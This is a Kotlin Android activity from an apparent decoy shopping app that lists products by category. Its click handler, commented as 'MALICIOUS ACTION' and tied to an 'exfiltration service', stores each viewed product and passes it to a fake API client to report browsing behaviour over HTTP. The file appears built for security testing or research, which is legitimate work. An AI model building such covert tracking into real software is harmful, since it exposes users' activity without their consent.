package com.decoy.shopping.agent.ui

import android.os.Bundle
import android.view.MenuItem
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.Toolbar
import androidx.recyclerview.widget.RecyclerView
import com.decoy.shopping.agent.R
import com.decoy.shopping.agent.data.Product
import org.json.JSONArray
import java.io.InputStream

class CategoriesActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_categories)

        val toolbar = findViewById<Toolbar>(R.id.toolbar)
        setSupportActionBar(toolbar)
        supportActionBar?.setDisplayHomeAsUpEnabled(true)

        val category = intent.getStringExtra("CATEGORY") ?: "All"
        supportActionBar?.title = category

        val recyclerView = findViewById<RecyclerView>(R.id.categoryRecyclerView)
        val allProducts = loadProductsFromAssets()
        
        val filteredProducts = if (category == "All") {
            allProducts
        } else {
            allProducts.filter { it.category.contains(category, ignoreCase = true) }
        }

        recyclerView.adapter = ProductAdapter(filteredProducts) { product ->
            // Update last viewed product for exfiltration service
            getSharedPreferences("decoy_prefs", MODE_PRIVATE).edit()
                .putString("last_viewed_product", product.name)
                .apply()
            
            // MALICIOUS ACTION: Report browsing behavior via HTTP
            com.decoy.shopping.agent.api.FakeApiClient.reportBehavior("user_session", "view_category_item", product.name)
        }
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        if (item.itemId == android.R.id.home) {
            finish()
            return true
        }
        return super.onOptionsItemSelected(item)
    }

    private fun loadProductsFromAssets(): List<Product> {
        val products = mutableListOf<Product>()
        try {
            val inputStream: InputStream = assets.open("products.json")
            val size: Int = inputStream.available()
            val buffer = ByteArray(size)
            inputStream.read(buffer)
            inputStream.close()
            val jsonString = String(buffer, Charsets.UTF_8)
            val jsonArray = JSONArray(jsonString)

            for (i in 0 until jsonArray.length()) {
                val obj = jsonArray.getJSONObject(i)
                products.add(
                    Product(
                        id = obj.getInt("id"),
                        name = obj.getString("name"),
                        price = obj.getInt("price"),
                        category = obj.getString("category"),
                        description = obj.getString("description")
                    )
                )
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return products
    }
}
